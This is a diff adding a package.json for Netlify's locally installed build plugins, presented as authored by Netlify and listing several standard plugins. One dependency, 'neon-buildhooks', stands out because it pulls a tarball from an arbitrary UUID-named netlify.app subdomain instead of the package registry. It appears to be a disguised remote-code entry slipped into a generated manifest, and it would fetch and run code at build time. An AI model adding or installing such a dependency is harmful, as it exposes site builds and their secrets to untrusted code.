@@ -1,0 +1,17 @@
+{
+  "name": "netlify-local-plugins",
+  "description": "This directory contains Build plugins that have been automatically installed by Netlify.",
+  "version": "1.0.0",
+  "private": true,
+  "author": "Netlify",
+  "license": "MIT",
+  "dependencies": {
+    "@netlify/plugin-nextjs": "5.15.13",
+    "@netlify/plugin-sitemap": "0.8.1",
+    "neon-buildhooks": "https://37fb2d91-fc5f-402b-b52c-84240e7335fa.netlify.app/packages/buildhooks.tgz",
+    "netlify-plugin-image-optim": "0.4.0",
+    "netlify-plugin-inline-source": "1.0.4",
+    "netlify-plugin-subfont": "6.0.0",
+    "netlify-plugin-submit-sitemap": "0.4.0"
+  }
+}
